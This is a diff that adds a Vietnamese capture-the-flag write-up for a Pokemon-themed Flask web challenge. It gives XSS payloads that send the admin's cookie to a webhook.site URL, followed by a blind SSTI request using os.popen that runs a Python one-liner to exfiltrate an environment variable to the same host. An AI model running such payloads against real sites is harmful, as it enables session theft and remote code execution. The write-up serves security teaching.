@@ -284,3 +284,267 @@ Góc nhìn tấn công
 **Vậy là đã cập nhật đươc số tiền từ 100 lên 999999 , bây giờ chỉ cần vào lại web và mua Mystery Gift Box để xem flag thôi** 
 
 `flag : KCSC{m3rry_chr1stm4s_4nd_h4ppy_h4ck1ng}`
+
+# Write-up: silver
+
+# 1. Mục tiêu
+
+- Mô tả đề: Chúng ta có một website quản lý Pokemon với chức năng "Report Team Rocket" cho phép gửi một đường dẫn (URL) để Admin (Bot) truy cập kiểm tra. Yêu cầu bắt buộc là URL phải thuộc domain nội bộ `http://localhost:5000`.
+- Mục tiêu cần đạt: Đánh cắp Cookie của Admin (nơi chứa Flag) bằng cách khai thác lỗ hổng bảo mật trên website.
+
+----
+# 2. Phân tích và Khai thác
+
+***Lần thứ 1***
+-
+Khi vừa vào trang web thì đọc thấy nó có dòng **We can display a personalized message for you!** (_Chúng tôi có thể hiển thị một thông điệp cá nhân hóa dành riêng cho bạn!_) . Chắc là gợi ý một điều gì đó .
+
+Tiếp theo mình để ý là dòng **Hello, Trainer test10!** ( _vì mình lấy username là test10_ ) và ở trên URL của web `/home?name=test10` , mình nghĩ cũng có khả năng là tham số name lấy thẳng input của mình nhập vào và in ra màn hình cùng với **hello , trainer**
+
+Mình vào thử xem source code thì thấy có một file `/static/js/script.js` 
+
+<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/a5777093-d056-4a02-a064-4699c00477c5" />
+
+
+
+Truy cập vào thì nó ra một source code thế này 
+```javascript
+function getUrlParameter(name) {
+    // Get parameter from URL query string
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+}
+
+function displayWelcomeMessage() {
+    const userName = getUrlParameter('name'); // khúc này lấy trực tiếp tham số name từ URL 
+    const messageDiv = document.getElementById('user-message');
+    
+    if (userName) {
+       // Gán trực tiếp vào HTML mà KHÔNG qua lọc rửa (sanitize)
+        messageDiv.innerHTML = '<h3>Hello, Trainer ' + userName + '!</h3>';
+        messageDiv.innerHTML += '<p>Welcome to the PokeCenter!</p>';
+    } else {
+        messageDiv.innerHTML = '<p>Add your name to the URL to get a personalized greeting!</p>';
+    }
+}
+
+// Execute when DOM is loaded
+document.addEventListener('DOMContentLoaded', function() {
+    displayWelcomeMessage();
+});
+```
+
+- Việc sử dụng innerHTML kết hợp với dữ liệu lấy từ URL (userName) cho phép chúng ta chèn mã HTML/JavaScript độc hại.
+- Lưu ý quan trọng: Khi dùng innerHTML trong HTML5, thẻ `<script>...</script>` sẽ không chạy. Thay vào đó, chúng ta phải dùng các thẻ HTML có sự kiện (event handlers) như `<img>` (với `onerror`) hoặc `<svg>` (với `onload`).
+
+Mình chuẩn bị một link webhook và payload mình sử dụng là : 
+
+`<img src=x onerror="fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?c='+document.cookie)">`
+
+**Giải thích** : Mình sẽ dùng thẻ `<img>` bị lỗi nguồn (`src=x`) để kích hoạt sự kiện `onerror`. Khi lỗi xảy ra, nó sẽ chạy lệnh **fetch** gửi Cookie của Admin về Webhook của mình.
+
+URL hoàn chỉnh nó sẽ như thế này : **`http://localhost:5000/?name=<img src=x onerror="fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?c='+document.cookie)">`**
+
+Rồi quay lại trang Report Team Rocket truyền URL đấy vào 
+- Giải thích luồng hoạt động của cách trên : 
+  - Bạn gửi link cho Admin.
+  - Admin (Bot) mở link đó trên trình duyệt nội bộ (`localhost:5000`).
+  - Trình duyệt của Admin chạy file `script.js`.
+  - `script.js` lấy đoạn mã độc `<img...>` từ URL và nhét vào trang web bằng innerHTML
+  - Trình duyệt thấy thẻ `img` có `src=x` (đường dẫn sai) -> kích hoạt `onerror`.
+  - Lệnh **fetch** chạy, lấy `document.cookie` (chứa **session/flag** của Admin) và gửi ra ngoài cho bạn.
+
+Nhưng kết quả là webhook của mình im ắng trống rỗng v , lúc đầu mình nghĩ chắc là do URL encoding .
+
+Khi bạn dán link có chứa dấu cách (space), dấu ngoặc kép " hoặc dấu < > vào URL, trình duyệt hoặc con Bot có thể cắt đứt chuỗi đó khiến code JS không chạy được trọn vẹn.
+
+Mình thử gửi lại bằng một URL mới đã được encoding : 
+
+`http://localhost:5000/?name=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27https%3A%2F%2Fwebhook.site%2F997f8339-d7fc-4ad3-a257-9bc92ba45d32%3Fcookie%3D%27%2Bdocument.cookie)%22%3E`
+
+Nhưng mà kết quả là webhook nó vẫn im ắng không thấy báo vì mặc dù trang Report đã hiển thị `Admin is visiting your URL`.
+
+Mình vẫn nghĩ chắc là tại Đôi khi trình duyệt của Admin (Bot) chặn việc gửi request fetch sang domain lạ (CORS policy)
+
+Rồi mình dùng lệnh Chuyển hướng thay vì **fetch**. Cách này ép trình duyệt của Admin phải bay sang Webhook của bạn ngay lập tức.
+
+Payload thô:  `<img src=x onerror="window.location='https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?c='+document.cookie">`
+
+URL encoding : `http://localhost:5000/?name=%3Cimg%20src%3Dx%20onerror%3D%22window.location%3D%27https%3A%2F%2Fwebhook.site%2F997f8339-d7fc-4ad3-a257-9bc92ba45d32%3Fc%3D%27%2Bdocument.cookie%22%3E`
+
+Nhưng mà kết quả vẫn như cũ , webhook không có động tĩnh gì 
+
+---
+***Lần thứ 2***
+-
+Lúc này mình chợt nhớ lại cái trang cũ có thể thực hiện javascript lấy tham số trực tiếp **name** chính là `/home` và mình thử lại cho chắc 
+
+Thử 1 câu lệnh đơn giản truyền vào sau tham số **name** : `<img src=x onerror=alert(1)>`
+
+Kết quả là nó hiện lên thẻ thông báo **1** thật 
+
+<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/91521de8-0754-40ab-b769-a81ce2ebbc50" />
+
+
+Mình thử tiếp xem server có bật HttpOnly hay không 
+
+`<img%20src=x%20onerror=alert(document.cookie)>`
+
+Thì nó có trả về PHPSESSID=... , session=..... , Vậy tức là HttpOnly đang tắt , trình duyệt cho phép JS đọc cookie 
+
+<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/80b1a6ee-2398-4633-9183-6ebdc93b018a" />
+
+
+Kết luận rằng : nãy giờ mình đã cố test ở trang chủ `/` , tại sao chi tiết này lại quyết định tất cả? Bởi vì đó là 2 đường dẫn hoàn toàn khác nhau `http://localhost:5000/` và `http://localhost:5000/home`
+
+- Nếu lỗi XSS (đoạn mã script.js xử lý name) chỉ được lập trình để chạy trên trang `/home`, thì khi bạn lùa con Bot vào trang `/`, nó sẽ chỉ thấy một trang trắng hoặc trang giới thiệu vô hại -> Không có XSS -> Không mất Cookie.
+
+Payload chốt hạ : 
+`http://localhost:5000/home?name=%3Cimg%20src%3Dx%20onerror%3D%22window.location.href='https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?c='%2Bdocument.cookie%22%3E`  
+
+Phải truyền đúng vào `/home` nha -> Kết quả webhook trả về : `session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.aT0LTA.aJ3bMLAH9uzfgtLAIBJjzNAJbp4` 
+
+Giải mã thì nó ra : `"role":"admin","username":"admin"`
+
+Mình vào lại trang web , bật f12 , chọn tab Application , chọn cookie và thay đổi giá trị cookie hiện tại của mình bằng cookie mới tìm được thì mình login vào được quyền **Admin**
+
+---
+***Lần thứ 3***
+-
+Sau khi vào đây thì mình tải về được 1 file có tên là **backup**
+
+Vậy là 1 bài từ Blackbox lại chuyển thành Whitebox 
+
+Mình thử vào file `docker-compose.yaml` thì thấy đoạn code 
+
+```yaml
+version: '3.8'
+
+services:
+  web:
+    build: .
+    ports:
+      - "5000:5000"
+    environment:
+      - ADMIN_PASSWORD=admin123
+      - FLAG=KCSC{REDACTED}
+```
+**Kết luận**: Flag nằm trong Biến môi trường (Environment Variable) của hệ thống, không phải trong file txt.
+
+**Mục tiêu**: Chúng ta cần thực thi lệnh env hoặc printenv trên server để in ra danh sách biến môi trường.
+
+Tiếp theo mình đọc source code trong file **app.py** thì có 
+```python
+@app.route('/admin/report-generator', methods=['GET', 'POST'])
+@admin_required
+def report_generator():
+    # ...
+    data = request.json
+    template_content = data.get('template', '')
+
+    # Ràng buộc 1: Giới hạn 55 ký tự
+    if len(template_content) > 55:
+        return jsonify({'error': 'Template too long (max 55 chars)'}), 400
+
+    try:
+        # Lỗ hổng: Render trực tiếp chuỗi người dùng nhập vào
+        render_template_string(template_content)
+    except Exception:
+        pass
+    
+    # Ràng buộc 2: Không in kết quả ra màn hình (Blind)
+    return jsonify({ 'success': True, ... }), 200
+```
+Trong Flask (Python), hàm này không chỉ đơn thuần là "in chữ ra màn hình". Nó đóng vai trò là một Bộ biên dịch (Compiler) mini.
+ 
+ - Nhiệm vụ của nó: Đọc một chuỗi văn bản, tìm các ký tự đặc biệt (như {{ ... }}), tính toán/chạy code bên trong đó, rồi mới trả về kết quả cuối cùng.
+ - Ví dụ: Nếu bạn đưa cho nó chuỗi `"Xin chào {{ 6*6 }}"`, nó sẽ không in ra y nguyên. Nó sẽ tính toán `6*6=36` và in ra `"Xin chào 36"`.
+
+Lỗ hổng xảy ra author : dunvu0  đã lấy trực tiếp những gì bạn nhập (template_content) và ném thẳng vào bộ biên dịch này mà không kiểm tra.
+
+Vậy giờ quy trình tấn công sẽ như thế này : 
+
+ - Khi bạn gửi đoạn payload (ví dụ {{ 7*7 }} hoặc lệnh Python)
+ - Input: Code nhận chuỗi từ `data.get('template')`.
+ - Execution: Hàm render_template_string nhìn thấy dấu ngoặc nhọn `{{ ... }}`.
+
+Nó hiểu rằng: "À, đây là code Jinja2 (ngôn ngữ template của Python), mình phải chạy nó!".
+ 
+ - Thay vì chỉ cộng trừ nhân chia, mình sẽ dùng các đối tượng đặc biệt có sẵn trong Python như config, self, __globals__ để mò mẫm ra module os (hệ điều hành).
+ - Lúc này có thể chạy lệnh Linux (như ls, cat, curl) ngay trên server.
+
+
+Bước 1: Chuẩn bị lệnh Python độc hại Lệnh này sẽ lấy biến môi trường FLAG và gửi đến Webhook của mình.
+
+**Payload** : 
+```python
+python -c "import urllib.request,os; urllib.request.urlopen('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?flag='+os.environ.get('FLAG'))"
+```
+
+Bước 2: Cấu hình Request trong Burp Suite Repeater tạo một request POST tới /admin/report-generator với nội dung như sau:
+```http
+POST /admin/report-generator?a=python%20-c%20%22import%20urllib.request%2Cos%3B%20urllib.request.urlopen(%27https%3A%2F%2Fwebhook.site%2F997f8339-d7fc-4ad3-a257-9bc92ba45d32%3Fflag%3D%27%2Bos.environ.get(%27FLAG%27))%22 HTTP/1.1
+Host: 67.223.119.69:32880
+Content-Type: application/json
+Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.aT0LTA.aJ3bMLAH9uzfgtLAIBJjzNAJbp4
+Content-Length: 62
+
+{"template": "{{url_for.__globals__.os.popen(request.args.a)}}"}
+```
+- `?a=python%20-c...`: mình nhét toàn bộ lệnh Python vào tham số `a`.
+- `Cookie`: Bắt buộc phải kèm session của Admin lấy được từ bước trước để vượt qua @admin_required.
+```python
+def admin_required(f):
+    """Decorator to check if user is admin"""
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        // kiểm tra xem có session username không?
+        // (Flask tự động giải mã Cookie bạn gửi lên để lấy thông tin này)
+        if not session.get('username'):
+            if request.is_json:
+                return jsonify({"error": "Authentication required"}), 401
+            return redirect(url_for('login'))
+        
+        // lấy thông tin user từ Database dựa trên username trong Cookie
+        username = session.get('username')
+        user = get_user(username)
+        
+        # Kiểm tra cột 'role'
+        if not user or user.get('role') != 'admin':
+            if request.is_json:
+                return jsonify({"error": "Admin access required"}), 403
+            return jsonify({"error": "Forbidden: Admin access only"}), 403
+        
+        return f(*args, **kwargs)
+    return decorated_function
+```
+- `{"template": "{{url_for.__globals__.os.popen(request.args.a)}}"}`: Nó ngắn gọn, hợp lệ, và nhiệm vụ duy nhất là bảo server: "Hãy chạy lệnh nằm trong tham số a của URL đi!". 
+
+Bước 3: Gửi và nhận Flag Sau khi bấm Send, server trả về {"success": true} (dù server không hiện kết quả lệnh, nhưng lệnh đã chạy ngầm).
+ 
+Mình quay sang tab Webhook.site kiểm tra và thấy một request gửi tới kèm theo Flag!
+`KCSC{G0tt4_h4ck_'3m_4ll!}`
+
+----
+# 3. Bài học rút ra 
+- Không bao giờ tin đầu vào người dùng
+
+Ở Client-side (Lỗi XSS): Lập trình viên đã lấy tham số name từ URL và nhét thẳng vào `innerHTML` mà không qua lọc rửa (sanitize).
+
+Ở Server-side (Lỗi SSTI): Lập trình viên đã lấy chuỗi `JSON template` và ném thẳng vào hàm `render_template_string()`.
+
+- Luôn luôn set HttpOnly=True cho các cookie quan trọng (Session ID, Token).
+
+
+
+
+
+
+
+
+
+
+
+
+
+
